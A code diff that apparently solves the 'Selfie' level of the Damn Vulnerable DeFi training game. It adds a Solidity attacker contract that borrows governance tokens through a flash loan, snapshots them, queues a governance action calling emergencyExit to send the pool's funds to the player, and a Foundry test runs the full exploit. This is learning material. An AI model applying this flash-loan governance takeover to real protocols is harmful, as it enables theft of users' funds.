@@ -12,22 +12,32 @@ contract Attacker is IERC3156FlashBorrower {
   SelfieLevel level;
   ISelfiePool pool;
   IERC20 token;
-  DamnValuableTokenSnapshot governance;
+  DamnValuableTokenSnapshot governanceToken;
+  ISimpleGovernance governance;
+  address player;
 
   constructor(SelfieLevel _level) {
     level = _level;
     pool = ISelfiePool(address(level.pool()));
     token = IERC20(address(level.token()));
-    governance = DamnValuableTokenSnapshot(address(level.governance()));
+    governanceToken = DamnValuableTokenSnapshot(address(level.token()));
+    governance = ISimpleGovernance(level.governance());
+    player = msg.sender;
   }
 
-  function attack() public {
+  function setPayload() public {
     pool.flashLoan(
       IERC3156FlashBorrower(this),
       address(token),
       pool.maxFlashLoan(address(token)),
       "0x"
     );
+  }
+
+  function attack() public {
+    // IRL we would obtain this id parameter by inspecting
+    // the log of the ActionQueued event.
+    governance.executeAction(1);
   }
 
   function onFlashLoan(
@@ -37,6 +47,17 @@ contract Attacker is IERC3156FlashBorrower {
         uint256,
         bytes calldata
     ) external returns (bytes32) {
+    // ???
+    governanceToken.snapshot();
+
+
+    bytes memory data = abi.encodeWithSelector(ISelfiePool.emergencyExit.selector, player);
+
+    governance.queueAction(
+      address(pool),
+      0,
+      data
+    );
 
     // return the loan
     token.approve(msg.sender, amount);
@@ -52,12 +73,12 @@ contract SelfieTest is Test {
   }
 
   function testExploit() public {
+    Attacker attacker = new Attacker(level);
+    attacker.setPayload();
     // advance time 2 days
     vm.warp(block.timestamp + 2 days);
-
-    Attacker attacker = new Attacker(level);
     attacker.attack();
 
-    // level.validate();
+    level.validate();
   }
 }
